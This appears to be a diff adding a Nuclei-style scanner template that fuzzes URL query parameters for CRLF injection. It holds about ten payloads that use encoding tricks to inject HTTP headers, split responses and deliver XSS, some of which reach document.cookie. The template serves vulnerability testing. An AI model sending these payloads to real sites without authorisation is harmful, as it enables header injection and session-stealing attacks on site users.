@@ -1,0 +1,53 @@
+id: crlf-fuzzing-chinese
+
+info:
+  name: CRLF Fuzzing Chinese
+  author: reewardius
+  severity: medium
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: fuzzing-crlf,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+      - "%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E"
+      - "%EA%A8%8AContent-Type:text/html%EA%A8%8AContent-Length:60%EA%A8%8A%EA%A8%8A%3Cimg%20src=1%20onerror=alert(1)%3E"
+      - "%C0%8D%C0%8AContent-Type:text/html%C0%8D%C0%8AContent-Length:60%C0%8D%C0%8A%C0%8D%C0%8A%3Cimg%20src=1%20onerror=alert(1)%3E"
+      - "%C4%8AContent-Type:text/html%C4%8AContent-Length:60%C4%8A%C4%8A%3Cimg%20src=1%20onerror=alert(1)%3E"
+      - "%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%21--"
+      - "%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(1)</script><!--"
+      - "a%0D%0AContent-Length:120%0D%0AContent-Type:text/html;%20charset=ISO-2022-JP%0D%0A%0D%0A%3Cimg%20src=x%20on%1B%28Jerror=al%1B%28Jert%28document.domain%29%3E"
+      - "a%0D%0AContent-Length:120%0D%0AX-XSS-Protection:0%0D%0AContent-Type:text/html;%20charset=ISO-2022-JP%0D%0A%0D%0A%3Cimg%20src=x%20on%1B%28Jerror=%22al%1B%28Jert%28document.co%1B%28Jokie%29%22%3E"
+      - "a%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E"
+      - "http://www.google.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2040%0d%0a%0d%0a<html><img src=1 onerror=alert(1)</html>"
+      
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{injection}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body 
+        words:
+          - "img src=x onerror=alert(document.cookie)"
+          - "img src=x onerror=alert(document.domain)"
+          - "img src=1 onerror=alert(1)"
+          - "<script>alert(1)</script>"
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "text/html"
